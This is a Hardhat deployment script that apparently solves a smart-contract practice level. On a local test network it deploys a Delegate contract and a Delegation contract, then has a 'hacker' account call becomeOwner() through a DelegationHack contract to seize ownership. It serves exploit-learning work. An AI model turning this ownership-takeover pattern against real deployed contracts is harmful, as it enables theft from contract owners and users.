const { utils } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat")

async function main(){
    
    const account = await ethers.getSigners();
    const deployer = account[0];
    const hacker_account = account[1];
    const tempAccount = account[3];

    console.log("Deployer address ", deployer.address);
    console.log("Hacker address ", hacker_account.address);


    console.log("Step 1")
    const delegate = await ethers.getContractFactory("contracts/Delegate.sol:Delegate", tempAccount);
    console.log("Step 1.1")

    const delegate_deploy = await delegate.deploy(tempAccount.address)
    
    console.log("Step 2")
    const delegation_con =  await ethers.getContractFactory("contracts/Delegation.sol:Delegation", deployer);
    console.log("Step 2.1")
    const delegation_h = await ethers.getContractFactory("DelegationHack");


    console.log("Step 3")
    const delegation_deploy = await delegation_con.deploy(delegate_deploy.address);
    console.log("Step 3.1")
    const delegation_hack_deploy = await delegation_h.deploy(delegation_deploy.address);
    console.log("Step 3.2")
    const callOwner = await delegation_hack_deploy.connect(hacker_account).becomeOwner();
    console.log("Step 3.3")

}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});